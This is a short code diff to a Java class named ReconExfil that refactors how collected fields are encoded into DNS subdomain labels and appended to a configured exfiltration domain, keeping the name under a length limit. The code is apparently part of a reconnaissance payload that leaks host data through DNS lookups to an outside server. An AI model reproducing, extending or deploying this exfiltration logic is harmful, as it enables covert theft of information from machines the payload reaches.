@@ -4,7 +4,9 @@ import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
-import java.util.*;
+import java.util.Map;
+import java.util.Properties;
+import java.util.Random;
 
 public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
@@ -83,15 +85,11 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     }
 
     String generateEncodedDomainName(String uniqueId, String... fields) {
-        List<String> encodedParts = new LinkedList<>();
-        for (String field : fields) {
-            encodedParts.add(encode(field));
-        }
-
         String lastPart = uniqueId + "." + CONF_EXFIL_DNS;
         StringBuilder domainBuilder = new StringBuilder();
-        for (String encodedPart : encodedParts) {
-            String addEncodedPart = encodedPart + ".";
+        for (String field : fields) {
+            String encodedField = encode(field);
+            String addEncodedPart = encodedField + ".";
             if (addEncodedPart.length() + domainBuilder.length() + lastPart.length() <= CONF_DOMAIN_MAX_LEN) {
                 domainBuilder.append(addEncodedPart);
             }
